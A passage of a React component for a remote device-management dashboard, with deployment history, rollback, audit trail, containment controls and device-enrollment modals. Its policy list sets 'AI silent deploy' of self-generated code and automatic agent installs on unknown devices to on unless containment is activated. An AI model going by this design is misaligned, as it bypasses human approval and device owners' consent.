                              <th key={h} className="text-left px-4 py-3 text-[10px] font-mono uppercase tracking-wider" style={{ color:"#6b8ab0" }}>{h}</th>
                            ))}
                          </tr>
                        </thead>
                        <tbody>
                          {historyJobs.map(job => (
                            <tr key={job.id} className="transition-colors hover:bg-purple-500/5" style={{ borderBottom:"1px solid rgba(59,130,246,0.08)" }}>
                              <td className="px-4 py-3 font-semibold" style={{ color:"#e2eaf6" }}>{job.target}</td>
                              <td className="px-4 py-3 font-mono" style={{ color:"#6b8ab0" }}>{job.type}</td>
                              <td className="px-4 py-3 font-mono" style={{ color:"#b8cce8" }}>v{job.version}</td>
                              <td className="px-4 py-3"><Chip color={DEPLOY_COLOR[job.status]}>{job.status}</Chip></td>
                              <td className="px-4 py-3"><Chip color={RISK_COLOR[job.risk]}>{job.risk}</Chip></td>
                              <td className="px-4 py-3 font-mono" style={{ color:"#6b8ab0" }}>{INIT_LABEL[job.initiator]}</td>
                              <td className="px-4 py-3 font-mono" style={{ color:"#5a536e" }}>{job.ts}</td>
                            </tr>
                          ))}
                        </tbody>
                      </table>
                    </div>
                  </div>
                )}
              </div>
            )}

            {/* ── RECOVERY ── */}
            {deployTab === "recovery" && (
              <div className="space-y-4">
                <div className="text-[10px] font-mono uppercase tracking-widest" style={{ color:"#6b8ab0" }}>Recovery Center</div>

                {/* Rollback targets */}
                <div className="space-y-3">
                  {deployJobs.filter(j => j.status !== "pending-approval").map(job => (
                    <div key={job.id} className="p-4 rounded-xl border" style={{ background:"#0a1628", borderColor:"rgba(59,130,246,0.2)" }}>
                      <div className="flex items-center justify-between gap-3 flex-wrap">
                        <div>
                          <div className="flex items-center gap-2 flex-wrap mb-1">
                            <span className="font-bold text-sm" style={{ color:"#e2eaf6" }}>{job.target}</span>
                            <Chip color={DEPLOY_COLOR[job.status]}>{job.status}</Chip>
                          </div>
                          <div className="text-[11px] font-mono" style={{ color:"#6b8ab0" }}>
                            Current: v{job.version}
                            {job.rollbackVersion && <> · Fallback: v{job.rollbackVersion}</>}
                          </div>
                          <div className="mt-1 space-y-0.5">
                            {job.log.map((l,i) => (
                              <div key={i} className="text-[10px] font-mono" style={{ color:"#1a3060" }}>· {l}</div>
                            ))}
                          </div>
                        </div>
                        <div className="flex gap-2">
                          {job.status !== "rolled-back" && (
                            <ActionBtn onClick={() => rollbackJob(job.id)} color="#f59e0b" outline><RotateCcw size={12}/>Rollback</ActionBtn>
                          )}
                          <ActionBtn onClick={() => show(`Recovery report for ${job.target} copied`,"info")} color="#6b8ab0" outline><FileText size={12}/>Report</ActionBtn>
                        </div>
                      </div>
                    </div>
                  ))}
                </div>

                {/* Incident review */}
                <div className="p-5 rounded-2xl border" style={{ background:"#0a1628", borderColor:"rgba(239,68,68,0.25)" }}>
                  <div className="font-bold text-sm mb-3" style={{ color:"#e2eaf6" }}>Incident Review</div>
                  {deployJobs.filter(j => j.status==="failed" || j.status==="rolled-back").length === 0
                    ? <div className="text-xs font-mono" style={{ color:"#1a3060" }}>No incidents to review</div>
                    : deployJobs.filter(j => j.status==="failed" || j.status==="rolled-back").map(job => (
                      <div key={job.id} className="py-3 border-b flex items-start gap-3" style={{ borderColor:"rgba(59,130,246,0.1)" }}>
                        <AlertTriangle size={14} color="#ef4444" className="mt-0.5 flex-shrink-0"/>
                        <div className="flex-1 min-w-0">
                          <div className="font-semibold text-xs" style={{ color:"#e2eaf6" }}>{job.target} — {job.type} v{job.version}</div>
                          <div className="text-[11px] font-mono mt-0.5" style={{ color:"#6b8ab0" }}>{job.ts} · Initiator: {INIT_LABEL[job.initiator]}</div>
                          <div className="text-[11px] font-mono mt-1" style={{ color:"#ef4444" }}>{job.log[job.log.length-1]}</div>
                        </div>
                        <Chip color={DEPLOY_COLOR[job.status]}>{job.status}</Chip>
                      </div>
                    ))
                  }
                </div>
              </div>
            )}

            {/* ── AUDIT TRAIL ── */}
            {deployTab === "audit" && (
              <div className="space-y-3">
                <div className="text-[10px] font-mono uppercase tracking-widest" style={{ color:"#6b8ab0" }}>Comprehensive Deployment Audit</div>
                <div className="rounded-2xl overflow-hidden border" style={{ background:"#0a1628", borderColor:"rgba(59,130,246,0.2)" }}>
                  {allDeployLogs.map((entry, i) => (
                    <div key={i} className="flex items-start gap-3 px-4 py-2.5 border-b hover:bg-purple-500/5 transition-colors"
                      style={{ borderColor:"rgba(59,130,246,0.08)" }}>
                      <span className="text-[10px] font-mono flex-shrink-0 mt-0.5" style={{ color:"#6b8ab0" }}>{entry.ts}</span>
                      <span className="text-[10px] font-mono flex-shrink-0 mt-0.5 w-16 truncate" style={{ color:"#5a536e" }}>{entry.target}</span>
                      <span className="text-[10px] font-mono flex-shrink-0" style={{ color:INIT_LABEL[entry.initiator]==="AI Auto"?"#3b82f6":"#10d9a0" }}>[{INIT_LABEL[entry.initiator]}]</span>
                      <span className="text-xs font-mono flex-1" style={{ color:"#b8cce8" }}>{entry.msg}</span>
                      <span className="text-[10px] font-mono flex-shrink-0" style={{ color:"#1a3060" }}>v{entry.version}</span>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* ── CONTAINMENT ── */}
            {deployTab === "containment" && (
              <div className="space-y-4">
                {/* Emergency containment banner */}
                <div className="p-5 rounded-2xl border" style={{ background:containmentActive?"rgba(220,38,38,0.1)":"#0a1628", borderColor:containmentActive?"rgba(220,38,38,0.5)":"rgba(59,130,246,0.2)" }}>
                  <div className="flex items-center justify-between flex-wrap gap-3 mb-4">
                    <div>
                      <div className="font-bold text-sm flex items-center gap-2" style={{ color:containmentActive?"#dc2626":"#e2eaf6" }}>
                        <Shield size={16} color={containmentActive?"#dc2626":"#3b82f6"}/>
                        Emergency Deployment Containment
                      </div>
                      <p className="text-xs mt-1" style={{ color:"#6b8ab0" }}>
                        When active: all auto-deployments halted, AI silent-deploy disabled, no installs on new devices.
                        Manual admin approval required for every operation.
                      </p>
                    </div>
                    <ActionBtn
                      onClick={() => { setContainment(v => !v); show(containmentActive ? "Containment lifted — auto-deploy resumed" : "CONTAINMENT ACTIVE — all deployments halted", containmentActive?"success":"error"); }}
                      color={containmentActive?"#10b981":"#dc2626"}>
                      {containmentActive ? <><Check size={13}/>Lift Containment</> : <><Ban size={13}/>Activate Containment</>}
                    </ActionBtn>
                  </div>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                    {[
                      { label:"AI Auto-Deploy",        blocked:containmentActive, desc:"AI-generated patches deployed silently" },
                      { label:"Unknown Device Install", blocked:containmentActive, desc:"Auto-install on discovered unknown devices" },
                      { label:"Code-Deploy Jobs",       blocked:containmentActive, desc:"Self-generated code pushed to agents" },
                      { label:"Watchdog Auto-Heal",     blocked:false,            desc:"Module hot-reload still permitted" },
                    ].map(item => (
                      <div key={item.label} className="flex items-center justify-between px-4 py-3 rounded-xl"
                        style={{ background:"#0d1930", border:`1px solid rgba(59,130,246,0.1)` }}>
                        <div>
                          <div className="text-xs font-semibold" style={{ color:"#e2eaf6" }}>{item.label}</div>
                          <div className="text-[10px] font-mono" style={{ color:"#6b8ab0" }}>{item.desc}</div>
                        </div>
                        <Chip color={item.blocked?"#ef4444":"#10b981"}>{item.blocked?"BLOCKED":"ACTIVE"}</Chip>
                      </div>
                    ))}
                  </div>
                </div>

                {/* Deployment policy */}
                <div className="p-5 rounded-2xl border" style={{ background:"#0a1628", borderColor:"rgba(59,130,246,0.2)" }}>
                  <div className="font-bold text-sm mb-3" style={{ color:"#e2eaf6" }}>Deployment Policy</div>
                  <div className="space-y-3">
                    {[
                      { label:"AI silent deploy",          on:!containmentActive, color:"#3b82f6", desc:"AI may deploy self-generated code without prompts",              toggleable:false },
                      { label:"Auto-install on discovery", on:!containmentActive, color:"#10d9a0", desc:"Unknown devices enrolled and agents installed automatically",     toggleable:false },
                      ...deployPolicies.map(p => ({ ...p, toggleable:true })),
                    ].map(p => (
                      <div key={p.label} className="flex items-center justify-between gap-3">
                        <div className="flex-1 min-w-0">
                          <span className="text-sm" style={{ color:p.on?"#b8cce8":"#6b8ab0" }}>{p.label}</span>
                          <div className="text-[10px] font-mono" style={{ color:"#1a3060" }}>{p.desc}</div>
                        </div>
                        <div className="flex items-center gap-2 flex-shrink-0">
                          <Chip color={p.on?(p.color||"#3b82f6"):"#6b8ab0"}>{p.on?"ON":"OFF"}</Chip>
                          {p.toggleable && (
                            <button
                              onClick={() => {
                                setDeployPolicies(prev => prev.map(x => x.label===p.label ? {...x, on:!x.on} : x));
                                show(`${p.label} ${p.on?"disabled":"enabled"}`);
                              }}
                              className="w-8 h-4 rounded-full relative flex-shrink-0"
                              style={{ background:p.on?(p.color||"#3b82f6"):"#0f1e3a" }}>
                              <div className="absolute top-0.5 w-3 h-3 rounded-full transition-all" style={{ left:p.on?"17px":"2px", background:"#fff" }}/>
                            </button>
                          )}
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            )}
          </div>
        );
      })()}

      {/* ══ ADD DEVICE MODAL ══ */}
      <Modal open={showAdd} onClose={() => setShowAdd(false)} title="Enroll New Device" wide>
        <div className="space-y-4">
          <div className="grid grid-cols-2 gap-3">
            <FLabel label="Device Name"><FInput value={aName} onChange={setAName} placeholder="e.g. MacBook Pro – Office"/></FLabel>
            <FLabel label="Owner / User"><FInput value={aUser} onChange={setAUser} placeholder="e.g. j.morgan"/></FLabel>
          </div>
          <div className="grid grid-cols-2 gap-3">
            <FLabel label="Operating System">
              <FSelect value={aOS} onChange={v => setAOS(v as OS)} options={[
                {val:"windows",label:"Windows"},{val:"macos",label:"macOS"},{val:"linux",label:"Linux"},
                {val:"android",label:"Android"},{val:"ios",label:"iOS"},{val:"harmony",label:"HarmonyOS"},
              ]}/>
            </FLabel>
            <FLabel label="Device Type">
              <FSelect value={aType} onChange={v => setAType(v as "desktop"|"mobile")} options={[
                {val:"desktop",label:"Desktop"},{val:"mobile",label:"Mobile"},
              ]}/>
            </FLabel>
          </div>

          <div className="flex gap-1 p-1 rounded-xl w-fit" style={{ background:"#0d1930", border:"1px solid rgba(59,130,246,0.22)" }}>
            {[{id:"code",label:"Connection Code"},{id:"ip",label:"Direct IP"}].map(t => (
              <button key={t.id} onClick={() => setATab(t.id as "code"|"ip")}
                className="px-4 py-1.5 rounded-lg text-xs font-semibold transition-all"
                style={{ background:aTab===t.id?"rgba(59,130,246,0.25)":"transparent", color:aTab===t.id?"#3b82f6":"#6b8ab0" }}>
                {t.label}
              </button>
            ))}
          </div>

          {aTab === "code" ? (
            <div className="space-y-3">
              <FLabel label="Connection Code">
                <div className="flex items-center gap-2">
                  <div className="flex-1 px-4 py-3 rounded-xl font-mono text-2xl tracking-[0.35em] font-black text-center"
                    style={{ background:"#0d1930", border:"1px solid rgba(59,130,246,0.4)", color:"#3b82f6" }}>
                    {code}
                  </div>
                  <button onClick={genCode} title="Regenerate" className="p-2.5 rounded-xl transition-all hover:opacity-80"
                    style={{ background:"rgba(59,130,246,0.15)", color:"#3b82f6", border:"1px solid rgba(59,130,246,0.3)" }}>
                    <RefreshCw size={14}/>
                  </button>
                  <button onClick={handleCopy} title="Copy" className="p-2.5 rounded-xl transition-all hover:opacity-80"
                    style={{ background:copied?"rgba(16,185,129,0.2)":"rgba(59,130,246,0.15)", color:copied?"#10b981":"#3b82f6", border:"1px solid rgba(59,130,246,0.3)" }}>
                    {copied ? <Check size={14}/> : <Clipboard size={14}/>}
                  </button>
                </div>
              </FLabel>
              <div className="px-4 py-3 rounded-xl text-xs" style={{ background:"rgba(6,182,212,0.08)", border:"1px solid rgba(6,182,212,0.25)", color:"#b8cce8" }}>
                Share this code. Download and install the Link Agent on the target device — it will appear in your dashboard within <strong style={{ color:"#10d9a0" }}>30–60 seconds</strong>.
              </div>
              <div className="flex flex-wrap gap-2">
                {(["windows","macos","linux","android","ios","harmony"] as OS[]).map(os => (
                  <button key={os} onClick={() => show(`Agent download started for ${OS_LABEL[os]}`,"info")}
                    className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-semibold transition-all hover:opacity-80"
                    style={{ background:`${OS_COLOR[os]}18`, color:OS_COLOR[os], border:`1px solid ${OS_COLOR[os]}30` }}>
                    <Download size={11}/>{OS_LABEL[os]}
                  </button>
                ))}
              </div>
            </div>
          ) : (
            <div className="space-y-3">
              <div className="grid grid-cols-3 gap-3">
                <div className="col-span-2"><FLabel label="IP Address"><FInput value={aIP} onChange={setAIP} placeholder="192.168.1.100"/></FLabel></div>
                <FLabel label="Port"><FInput value={bPort} onChange={setBPort} placeholder="4433"/></FLabel>
              </div>
            </div>
          )}

          <div className="flex justify-end gap-3 pt-2 border-t" style={{ borderColor:"rgba(59,130,246,0.15)" }}>
            <ActionBtn onClick={() => setShowAdd(false)} color="#6b8ab0" outline>Cancel</ActionBtn>
            <ActionBtn onClick={handleAddDevice} color="#3b82f6"><Signal size={13}/>Enroll Device</ActionBtn>
          </div>
        </div>
      </Modal>

      {/* ══ MANAGE DEVICE MODAL ══ */}
      <Modal open={showManage} onClose={() => setShowManage(false)} title={`Manage — ${manageDev?.name ?? ""}`} wide>
        <div className="space-y-4">
          <div className="grid grid-cols-2 gap-3">
            <FLabel label="Device Name"><FInput value={mName} onChange={setMName}/></FLabel>
            <FLabel label="IP Address"><FInput value={mIP} onChange={setMIP}/></FLabel>
          </div>
          <div className="grid grid-cols-2 gap-3">
            <FLabel label="Status">
              <FSelect value={mStatus} onChange={v => setMStatus(v as DeviceStatus)} options={[
                {val:"online",label:"Online"},{val:"offline",label:"Offline"},{val:"warning",label:"Warning"},{val:"suspended",label:"Suspended"},
              ]}/>
            </FLabel>
            <FLabel label="Health">
              <FSelect value={mHealth} onChange={v => setMHealth(v as "excellent"|"good"|"warning")} options={[
                {val:"excellent",label:"Excellent"},{val:"good",label:"Good"},{val:"warning",label:"Warning"},
              ]}/>
            </FLabel>
          </div>
          <div className="grid grid-cols-2 gap-3">
            <ActionBtn onClick={() => show(`Screenshot from ${manageDev?.name}`,"info")} color="#10d9a0" outline full><Camera size={13}/>Take Screenshot</ActionBtn>
            <ActionBtn onClick={() => show(`Shell opened on ${manageDev?.name}`,"info")} color="#10b981" outline full><Terminal size={13}/>Open Shell</ActionBtn>
            <ActionBtn onClick={() => { show(`Rebooting ${manageDev?.name}…`,"info"); setShowManage(false); }} color="#f59e0b" outline full><RotateCcw size={13}/>Reboot Device</ActionBtn>
            <ActionBtn onClick={() => show(`OTA update pushed to ${manageDev?.name}`)} color="#3b82f6" outline full><Upload size={13}/>Push OTA Update</ActionBtn>
          </div>
          <div className="flex justify-between gap-3 pt-2 border-t" style={{ borderColor:"rgba(59,130,246,0.15)" }}>
            <ActionBtn onClick={handleRemoveDev} color="#ef4444" outline><X size={13}/>Remove Device</ActionBtn>
            <div className="flex gap-2">
              <ActionBtn onClick={() => setShowManage(false)} color="#6b8ab0" outline>Cancel</ActionBtn>
              <ActionBtn onClick={handleSaveManage} color="#3b82f6"><Check size={13}/>Save Changes</ActionBtn>
            </div>
          </div>
        </div>
      </Modal>

      {/* ══ CONNECT BY IP MODAL ══ */}
      <Modal open={showByIP} onClose={() => setShowByIP(false)} title="Connect by IP Address">
        <div className="space-y-4">
          <FLabel label="Device Label"><FInput value={bName} onChange={setBName} placeholder="e.g. Office Server"/></FLabel>
          <div className="grid grid-cols-3 gap-3">
            <div className="col-span-2"><FLabel label="IP Address"><FInput value={bIP} onChange={setBIP} placeholder="192.168.1.100"/></FLabel></div>
            <FLabel label="Port"><FInput value={bPort} onChange={setBPort} placeholder="4433"/></FLabel>
          </div>
          <FLabel label="Username (optional)"><FInput value={bUser} onChange={setBUser} placeholder="admin"/></FLabel>
          <FLabel label="Password (optional)"><FInput value={bPass} onChange={setBPass} type="password" placeholder="••••••••"/></FLabel>
          <div className="flex justify-end gap-3 pt-2 border-t" style={{ borderColor:"rgba(59,130,246,0.15)" }}>
            <ActionBtn onClick={() => setShowByIP(false)} color="#6b8ab0" outline>Cancel</ActionBtn>
            <ActionBtn onClick={handleByIP} color="#10d9a0"><Server size={13}/>Connect</ActionBtn>
          </div>
        </div>
      </Modal>


      {/* ══ QR MODAL ══ */}
      {showQR && <AdminQRModal onClose={() => setShowQR(false)} show={show} />}
    </div>
  );
}


